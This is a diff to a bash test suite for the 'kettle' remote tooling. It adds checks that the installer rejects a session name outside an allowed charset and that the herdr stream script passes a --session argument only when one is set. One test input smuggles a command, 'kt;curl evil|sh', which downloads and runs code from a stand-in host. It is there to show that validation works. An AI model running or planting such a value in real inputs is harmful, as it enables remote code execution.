@@ -372,6 +372,17 @@ except Exception as e:
 
 test_relay() {
   echo "relay"
+
+  # The host file's session name ends up on a remote command line, so the
+  # writer rejects anything outside herdr's naming charset — before the ssh
+  # probe, which is what lets this run with no host. (Relay.qml re-checks the
+  # same charset on load; a hand-edited host file never reaches an argv.)
+  local badsess
+  badsess=$("$ROOT/bin/kettle-remote" install kettle-test-host --session 'kt;curl evil|sh' 2>&1)
+  has "a session name outside the charset is refused" "$badsess" "invalid session name"
+  is "  and no host file is written" \
+     "$([[ -e "$HOME/.config/kettle/hosts/kettle-test-host" ]] && echo written || echo none)" "none"
+
   if [[ ! -S $SOCK ]]; then
     skipt "relay protocol" "no socket at $SOCK — shell not running with the plugin"
     return
@@ -501,6 +512,32 @@ print(a['id'], a['state'], a['agent'], a['seq'], a['title'], a['name'], len(d['a
   local count
   count=$(printf '%s\n' "$out" | grep -c '^S ')
   is "emits one S line for unchanged state" "$count" "1"
+
+  # A `herdr --remote host --session name` server owns a different socket, so
+  # the session has to reach the remote CLI — and an unset one must not become
+  # an empty --session, which herdr rejects.
+  cat > "$T/herdr-argv" <<'STUB'
+#!/bin/bash
+printf '%s\n' "$*" >> "$KETTLE_STUB_ARGV"
+cat "$KETTLE_STUB_SNAPSHOT"
+STUB
+  chmod +x "$T/herdr-argv"
+
+  : > "$T/argv-session"
+  KETTLE_HERDR="$T/herdr-argv" KETTLE_STUB_SNAPSHOT="$T/snap.json" \
+    KETTLE_STUB_ARGV="$T/argv-session" KETTLE_SESSION=kt \
+    KETTLE_INTERVAL=1 KETTLE_HEARTBEAT=2 \
+    timeout 3 bash "$ROOT/bin/kettle-herdr-stream.sh" >/dev/null 2>&1
+  is "a session reaches the remote herdr" \
+     "$(head -1 "$T/argv-session")" "api snapshot --session kt"
+
+  : > "$T/argv-plain"
+  KETTLE_HERDR="$T/herdr-argv" KETTLE_STUB_SNAPSHOT="$T/snap.json" \
+    KETTLE_STUB_ARGV="$T/argv-plain" \
+    KETTLE_INTERVAL=1 KETTLE_HEARTBEAT=2 \
+    timeout 3 bash "$ROOT/bin/kettle-herdr-stream.sh" >/dev/null 2>&1
+  is "no session means no --session argument" \
+     "$(head -1 "$T/argv-plain")" "api snapshot"
 
   # herdr failing must say so explicitly, not fall silent with stale pots.
   cat > "$T/herdr-dead" <<'STUB'
